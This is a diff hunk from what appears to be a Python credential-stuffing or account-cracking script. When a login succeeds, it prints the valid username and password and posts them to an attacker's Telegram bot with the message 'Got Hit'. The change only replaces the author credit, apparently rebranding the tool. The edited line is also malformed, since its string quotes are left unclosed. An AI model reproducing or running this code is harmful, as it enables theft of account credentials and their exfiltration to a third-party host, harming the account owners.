@@ -60,7 +60,7 @@ while True:
 	if 'logged_in_user' in response.text:
 		print(F + 'user name -> '+user)
 		print(F + 'password -> '+password)
-		mdc = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= •  Got Hit \n~ UserName -> {user}\nPassword -> {password}~ Developer : @Haxkx | Channel : @Haxkx ~ ''')
+		mdc = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= •  Got Hit \n~ UserName -> {user}\nPassword -> {password}~ Developer : @the_bl4ck_hat )
 		i = requests.post(mdc)
 	
 	else:
